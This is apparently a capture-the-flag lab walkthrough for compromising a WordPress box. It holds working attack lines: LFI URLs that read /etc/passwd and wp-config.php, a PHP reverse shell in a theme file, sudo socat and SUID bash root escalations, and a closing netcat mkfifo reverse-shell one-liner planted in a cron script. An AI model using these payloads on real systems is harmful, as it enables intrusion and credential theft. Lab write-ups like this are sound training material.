Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.36.47 --ulimit 5000
```

We got the open ports and now we can scan them in detail using nmap,

```bash
nmap -sCV -p21,22,80 10.10.36.47 -oN nmap.log
```

![image](https://user-images.githubusercontent.com/67465230/187158541-0f75f65f-0273-475a-ba46-4d9248461805.png)

Result scan shows that port 21 is running ftp service, port 22 is running ssh and port 80 is running apache webserver. Let's first enumerate ftp service.

Let's login to ftp server using ftp client,

```bash
ftp 10.10.36.47
```

![image](https://user-images.githubusercontent.com/67465230/187158591-e6809daa-ea46-49f0-8d90-72cc3217d333.png)

We're connected to ftp server.

Let's enumerate directory using `ls -la` command and we can see nothing here,

![image](https://user-images.githubusercontent.com/67465230/187158634-707b09fc-5f45-423b-8b9e-b6bfde702c99.png)

Let's move to port 80 to enumerate web server. Visit http://10.10.36.47,

![image](https://user-images.githubusercontent.com/67465230/187158679-d64c15cf-add8-46c8-ae68-ed90a246ead1.png)

we got default ubuntu webpage. Nothing much!

Let's try to fuzz hidden directories using gobuster,

```bash
gobuster dir -u http://10.10.36.47/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -q 2>/dev/null -o gobuster.log
```

![image](https://user-images.githubusercontent.com/67465230/187158724-316f4f72-07a3-45fe-94d4-edc1f941fcf8.png)

after fuzzing directories, we got 2 hidden directories, i.e. hackathons and wordpress.

Let's start enumerating hackathons directory by visiting http://10.10.36.47/hackathons,

![image](https://user-images.githubusercontent.com/67465230/187158872-85b39b02-8864-4c82-94ac-d118d39fda5d.png)

There's one liner simple text on the webpage with a word **Vinegar** (I wonder what this means).

But checking it's source code and scrolling down to bottom, we got 2 strings in comments (seems interesting!),

![image](https://user-images.githubusercontent.com/67465230/187158933-894d3f70-fb01-49a2-a32a-dbcb3d4fe165.png)

Now we have Cyberchef to decode this string. At first I was thinking that I should take a look at walkthrough because I don't know what kind of encoding is this. On a second thought, I decided to take a step back and then I got the hint from the name mentioned above, *Vinegar* (maybe Vigenere cypher?),

![image](https://user-images.githubusercontent.com/67465230/187158987-4fa1c66a-8dfd-43d0-900b-6e73c85d89fd.png)

I tried to decode the string and got the output.

Now, let's visit http://10.10.36.47/wordpress,

![image](https://user-images.githubusercontent.com/67465230/187159139-d8ea52ea-ea58-4dbf-bc82-01863f0d26b9.png)

we got the wordpress running website. We can either enumerate it manually or using wpscan tool (automated wordpress website scanner).

Using the command below, 

```bash
wpscan --url http://10.10.36.47/wordpress/ -e ap
```

![image](https://user-images.githubusercontent.com/67465230/187159230-72af416c-67f9-4839-af90-7e8b20fba11b.png)
![image](https://user-images.githubusercontent.com/67465230/187159297-9c351922-d772-47de-8943-2afe1e89031d.png)

we can see that there is twentytwenty these in use on website and plugin identified is Mail Masta 1.0.

After identifying the plugin and it's version, I quickly searched for [Mail Masta Exploit](https://www.exploit-db.com/exploits/40290) ,

> **WordPress Plugin Mail Masta 1.0 - Local File Inclusion** : The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

Now, since we know that this website is vulnerable to LFI, we can visit the following URL to achieve LFI,

```
http://10.10.36.47/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

![image](https://user-images.githubusercontent.com/67465230/187159348-9b4ce0e7-c5f0-45f8-b513-1fbacce30f7a.png)

we can see the content of /etc/passwd file, meaning we have successfully exploited LFI vulnerability.

Now, I tried to read wp-config.php file with php filter wrapper which encodes data into base64 before presenting it to user,

```
http://10.10.36.47/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```

![image](https://user-images.githubusercontent.com/67465230/187159409-3adf55bb-8a49-4a95-8da1-5696a896922b.png)

and I got the long base64 string. 

I decided to decode this string using this command,

```bash
echo '<base64 string>' | base64 -d
```

![image](https://user-images.githubusercontent.com/67465230/187159528-4319b89e-0b44-4829-8177-16554a149132.png)

we got the username, password, database name, etc.

Now we can login to wordpress panel using elyana's credentials,

![image](https://user-images.githubusercontent.com/67465230/187159577-fc66c100-cb58-4a1e-9063-8bcccf7677c7.png)

after entering the credentials, we can click on *Remind me later* button and we will be taken on home page of the wordpress panel.

After enumerating website, I saw the file named 404.php can be edited by the user. So I tried to put the php-reverse-shell here and change the IP and port to desired ones. I also started netcat listener to catch the connection,

![image](https://user-images.githubusercontent.com/67465230/187159661-595e99fa-5f2c-46fe-a4a9-c4e0cd25fa7b.png)

Now, I visited the url to trigger the 404.php page,

```
http://10.10.36.47/wordpress/wp-content/themes/twentytwenty/404.php
```

and I got the reverse connection,

![image](https://user-images.githubusercontent.com/67465230/187159720-096f6d45-1968-4852-9f61-17ca060c2990.png)

Next, I tried to improve upon my shell,

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + Z
stty raw -echo; fg
stty rows 56 columns 238
```

So I started with enumerating home directory of elyana user and got user.txt file,

![image](https://user-images.githubusercontent.com/67465230/187159779-00ead505-e0a1-4fa6-a71c-7d0f718f46a1.png)

But when I tried to read the user.txt file, I got Permission Denied message, meaning, currently, I can't read the file of elyana user,

![image](https://user-images.githubusercontent.com/67465230/187159814-3318396d-4c09-46ea-b2b0-113f446ab4d5.png)

Then I started the python server using `python3 -m http.server` and then upload the linpeas.sh script in /tmp directory of the target machine and then fire it off, 

![image](https://user-images.githubusercontent.com/67465230/187159867-a57e0d8a-e2a7-45bf-abef-086d592b3a4f.png)

scrolling down and I got the interesting file **/etc/mysql/conf.d/private.txt**. 

So I read the content of the private.txt file and BOOM, guess what? I got the elyana user credentials,

![image](https://user-images.githubusercontent.com/67465230/187159912-031cd4d0-2ed1-44ba-b1fe-bd7f91189b58.png)

Now, I will quickly change to elyana user and then issue id command to check if we're elyana user or not, don't worry, we're (:

```bash
su elyana
id
```

![image](https://user-images.githubusercontent.com/67465230/187159938-0c3f7261-0382-49b7-b25b-fec5d6a49beb.png)

Now, we can read the user.txt file this time,

![image](https://user-images.githubusercontent.com/67465230/187159989-72193698-a4bd-4d18-9362-517107ddd3c9.png)

but we got another string which we can't read easily.

So I decided to throw this string into Cyberchef and using Magic tab, I got to know the user flag,

![image](https://user-images.githubusercontent.com/67465230/187160032-e1dd5820-71ac-408f-8d75-d2f6f3246dd6.png)

Now, time for privilege escalation! I listed all the binaries which I can run using sudo command without providing password,

```bash
sudo -l
```

![image](https://user-images.githubusercontent.com/67465230/187160102-f825c739-6847-4617-8ffc-449f4aae9a83.png)

and I can use **/usr/bin/socat** binary as sudo. 

So navigating to GTFObins and search for socat, I got the command to execute to become root,

![image](https://user-images.githubusercontent.com/67465230/187160158-de13ac53-9e60-465d-bec1-44945dde38d1.png)

So I copied the command and paste it into terminal and execute it and became root user,

```bash
sudo /usr/bin/socat stdin exec:/bin/sh
id
```

![image](https://user-images.githubusercontent.com/67465230/187160206-cf1186b5-0da9-4ca2-bda7-e7daa01a54a7.png)

## Abusing SUIDs

Looking at another method to become root user. We can find binaries which has SUID bit set on them so we can leverage them to become root user. Following below command list all the binaries which has SUID bit set on them,

```bash
find / -perm -04000 -type f 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187160278-9976271c-6d38-4ec9-830c-88504d6870b4.png)

we can see that **/bin/bash** stands out extraordinary from all the binaries. 

Now, to escalate the user's privilege, command is relatively simple as we're using **/bin/bash** binary with `-p` tag to preserve the privileges,

```bash
/bin/bash -p
id
```

![image](https://user-images.githubusercontent.com/67465230/187160343-1d076563-d81f-45d6-9e1b-80bfe0b0a548.png)

and we became root.

## Abusing CronJobs

Another method to become root user is to abuse Cronjobs. We can view the content of crontab file,

```bash
cat /etc/crontab
```

![image](https://user-images.githubusercontent.com/67465230/187160408-7f710379-c5cc-4ca9-bfe5-13e40ae473fc.png)

there's a file named /var/backups/script.sh file and it runs as root user. 

Viewing the content of this script, I thought that I can put the one-liner reverse shell,

![image](https://user-images.githubusercontent.com/67465230/187160463-aa7f81a5-8206-4e1d-8cf3-ddc77e32440d.png)

What I was thinking about putting one-liner reverse shell was true because upon viewing the rwx permissions of this script, owner, groups and others can read-write-execute this script,

```bash
ls -la /var/backups/script.sh
```

![image](https://user-images.githubusercontent.com/67465230/187160558-5285a041-cca0-4817-b7ad-a652c5dc565b.png)

So I placed the netcat one-liner reverse shell,

```bash
cat > /var/backups/script.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.6.230 5555 >/tmp/f
```
